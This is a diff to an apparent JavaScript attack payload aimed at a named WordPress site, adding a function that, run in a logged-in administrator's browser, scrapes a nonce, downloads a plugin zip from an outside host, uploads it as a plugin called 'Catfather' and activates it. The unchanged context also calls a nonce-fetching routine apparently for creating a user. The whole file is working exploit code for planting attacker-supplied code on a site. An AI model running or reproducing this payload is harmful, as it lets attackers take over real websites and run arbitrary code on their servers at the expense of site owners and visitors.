@@ -1,4 +1,38 @@
-const target =  "https://wordpress-777569-2902678.cloudwaysapps.com";
+let target =  "https://wordpress-777569-2902678.cloudwaysapps.com";
+let myPluginName = 'Catfather';
+
+async function uploadFile(){
+
+    const html = await fetch(target+'/wp-admin/plugin-install.php');
+    const body = await html.text();
+    const regex = /_wpnonce" value="(.*?)"/;
+    const nonce = regex.exec(body) !== null ? regex.exec(body)[1]: null;
+    if (!nonce) return;
+
+    const zipFile = await fetch('https://mrcatdev.com/cat-up.zip');
+
+    let formData = new FormData();
+    formData.append('_wpnonce',nonce);
+    formData.append('_wp_http_referer','/wp-admin/plugin-install.php');
+    formData.append('install-plugin-submit','Install Now');
+    formData.append('pluginzip',await zipFile.blob());
+
+    await fetch(target+'/wp-admin/update.php?action=upload-plugin',{
+        method: 'POST',
+        credentials: 'include',
+        body: formData
+    });
+
+    const pluginUrl = target+"wp-admin/plugins.php?s="+myPluginName+"&plugin_status=search"
+    const pagePlugin = await fetch(pluginUrl)
+    const content = await pagePlugin.text();
+    const linkRegex = /plugins\.php\?action=activate.*?"/
+    const activateUrl = linkRegex.exec(content)[0].replace('"','').replaceAll("&amp;","&")
+    await fetch(activateUrl,{
+            credentials : 'include'
+    });
+}
+
 
 // Get Create User Nonce
 async function getNonce(){
@@ -46,4 +80,4 @@ function dataMaker(rawData){
 }
 
 getNonce();
-
+uploadFile();
